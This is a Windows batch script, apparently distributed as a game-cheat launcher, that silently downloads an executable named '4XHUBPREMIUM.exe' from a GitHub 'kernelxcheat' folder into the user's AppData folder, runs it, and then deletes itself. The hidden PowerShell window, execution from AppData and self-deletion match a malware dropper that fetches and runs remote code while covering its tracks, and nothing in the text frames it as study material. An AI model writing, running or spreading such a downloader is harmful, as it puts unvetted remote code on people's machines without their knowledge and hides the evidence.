@echo off
setlocal

set "URL=https://github.com/emad8787/panel/raw/refs/heads/main/kernelxcheat/4XHUBPREMIUM.exe"
set "SAVE_PATH=%appdata%\4XHUBPREMIUM.exe"

:: If old file exists, delete it
if exist "%SAVE_PATH%" (
    echo Removing old version...
    del /f /q "%SAVE_PATH%"
)

:: Download silently
powershell -WindowStyle Hidden -Command ^
"Invoke-WebRequest -Uri '%URL%' -OutFile '%SAVE_PATH%'"

:: Run the new file if download succeeded
if exist "%SAVE_PATH%" (
    start "" "%SAVE_PATH%"
)

:: Self-delete this .bat file
(del "%~f0") & exit
